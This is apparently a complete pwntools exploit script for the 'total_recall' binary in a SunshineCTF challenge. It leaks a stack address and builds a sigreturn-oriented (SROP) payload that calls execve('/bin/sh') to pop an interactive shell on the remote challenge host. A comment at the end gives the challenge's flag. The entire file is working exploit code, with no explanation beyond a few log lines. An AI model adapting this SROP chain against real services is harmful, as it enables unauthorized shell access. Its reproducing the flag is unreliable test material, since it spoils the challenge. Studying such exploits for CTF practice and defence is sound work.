#!/usr/bin/env python3
from pwn import *

PORT = 26003
HOST = "chal.sunshinectf.games"
elf = context.binary = ELF('./total_recall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x000000000040106B
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

stack = u64(p.recvn(8))
buf = stack - 0x80
syscall = 0x401014
pop_rax_read_ret = 0x401031
binsh = buf + 0x300
log.info(f'leaked rsp: {hex(stack)}')
log.info(f'stage2 buffer: {hex(buf)}')

# GDB()
p.send(b'A'*0x18)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rsp = buf + 0x380
frame.rip = syscall

pl = flat(
    b'A'*0x80,
    pop_rax_read_ret,
    0,
    syscall,
    bytes(frame),
)
pl = pl.ljust(0x300, b'\x00') + b'/bin/sh\x00'
pl = pl.ljust(0x400, b'\x00')
p.send(pl)
p.send(b'B'*0xf)

p.interactive()

# sun{r3caLl_ev3Ry_reGist3r_sR0p}